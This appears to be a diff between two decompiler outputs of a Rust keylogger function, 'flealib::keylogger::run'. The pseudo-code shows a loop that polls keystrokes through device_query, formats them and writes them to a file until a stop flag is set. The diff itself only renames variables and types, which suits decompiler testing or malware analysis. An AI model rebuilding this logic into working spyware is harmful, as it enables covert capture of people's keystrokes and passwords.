@@ -1,4 +1,4 @@
-long long flealib::keylogger::run(struct_0 *a0, unsigned long long a1)
+long long flealib::keylogger::run(struct_1 *a0, unsigned long long a1)
 {
     unsigned int v0;  // [bp-0x12c]
     void* v1;  // [bp-0x128]
@@ -16,7 +16,7 @@ long long flealib::keylogger::run(struct_0 *a0, unsigned long long a1)
     void* v13;  // [bp-0xd8], Other Possible Types: char
     char *v14;  // [bp-0xc8], Other Possible Types: char
     unsigned long long v15;  // [bp-0xc0]
-    struct_0 *v16;  // [bp-0xb0]
+    struct_1 *v16;  // [bp-0xb0]
     int v17;  // [bp-0xa8]
     unsigned long long v18;  // [bp-0xa8]
     unsigned long long v19;  // [bp-0xa0]
@@ -26,10 +26,9 @@ long long flealib::keylogger::run(struct_0 *a0, unsigned long long a1)
     char *v23;  // [bp-0x50]
     unsigned long long v24;  // [bp-0x48]
     char v25;  // [bp-0x40]
-    unsigned long long v28;  // rax
-    unsigned long long v29;  // rdx
-    struct_2 *v31;  // rax
-    char v32;  // sil
+    unsigned long long v28;  // rdx
+    struct_2 *v30;  // rax
+    char v31;  // sil
 
     v5 = a1;
     v16 = a0;
@@ -67,8 +66,7 @@ long long flealib::keylogger::run(struct_0 *a0, unsigned long long a1)
     while (true)
     {
         v7.get_keys(&v6);
-        v28 = 1.index(v4);
-        if (!(char)v8.equal(v11, v28, v29) && v11)
+        if (!(char)v8.equal(v11, 1.index(v4), v28) && v11)
         {
             v14 = &v7;
             v15 = <alloc::vec::Vec<T,A> as core::fmt::Debug>::fmt;
@@ -85,14 +83,14 @@ long long flealib::keylogger::run(struct_0 *a0, unsigned long long a1)
         v4 = v20;
         *((int128_t *)&v2) = (int128_t)v17;
         (char)v17.lock(v5 + 16);
-        v31 = (char)v17.unwrap();
-        v32 = (char)v29 & 1;
-        if (v31->field_5)
+        v30 = (char)v17.unwrap();
+        v31 = (char)v28 & 1;
+        if (v30->field_5)
             break;
-        core::ptr::drop_in_place<std::sync::mutex::MutexGuard<flealib::keylogger::Keylogger>>(v31, v32);
+        core::ptr::drop_in_place<std::sync::mutex::MutexGuard<flealib::keylogger::Keylogger>>(v30, v31);
         std::thread::sleep(0, &g_989680);
     }
-    core::ptr::drop_in_place<std::sync::mutex::MutexGuard<flealib::keylogger::Keylogger>>(v31, v32);
+    core::ptr::drop_in_place<std::sync::mutex::MutexGuard<flealib::keylogger::Keylogger>>(v30, v31);
     ::0x7a1b00::core::ptr::drop_in_place<std::fs::File>(v0);
     core::ptr::drop_in_place<alloc::vec::Vec<device_query::keymap::Keycode>>(&v1);
     core::ptr::drop_in_place<device_query::device_state::linux::DeviceState>(&v6);
